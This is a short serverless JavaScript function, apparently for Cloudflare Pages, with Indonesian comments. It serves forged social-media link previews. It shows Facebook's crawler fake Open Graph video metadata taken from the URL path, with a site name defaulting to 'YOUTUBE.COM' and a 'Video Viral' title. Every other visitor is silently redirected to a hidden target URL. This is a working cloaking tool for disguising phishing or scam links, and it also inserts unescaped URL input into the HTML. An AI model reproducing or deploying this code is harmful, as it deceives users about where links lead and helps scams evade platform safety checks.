export async function onRequest(context) {
  const url = new URL(context.request.url);
  const pathParts = url.pathname.split('/').filter(p => p);

  // Jika tidak ada data di path, redirect ke Google
  if (pathParts.length < 1) {
    return Array.from(url.searchParams).length > 0 ? null : Response.redirect("https://google.com", 302);
  }

  // Memecah data dari URL (Pemisah menggunakan tiga underscore '___')
  const parts = pathParts[0].split('___'); 

  const title  = decodeURIComponent(parts[1] || "Video Viral");
  const domain = decodeURIComponent(parts[2] || "YOUTUBE.COM");
  const desc   = decodeURIComponent(parts[3] || "Klik untuk menonton...");
  const image  = decodeURIComponent(parts[4] || "");
  const target = decodeURIComponent(parts[5] || "https://google.com");

  return new Response(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>${title}</title>
      <meta property="fb:app_id" content="966242223397117">
      <meta property="og:url" content="${url.href}">
      <meta property="og:site_name" content="${domain}">
      <meta property="og:title" content="${title}">
      <meta property="og:description" content="${desc}">
      <meta property="og:image" content="${image}">
      <meta property="og:type" content="video.other">
      <meta property="og:video:url" content="${url.href}">
      <meta property="og:video:type" content="text/html">
      <meta property="og:video:width" content="1280">
      <meta property="og:video:height" content="720">
      <script>if(!navigator.userAgent.includes('facebookexternalhit')){window.location.href="${target}";}</script>
    </head>
    <body></body>
    </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
}
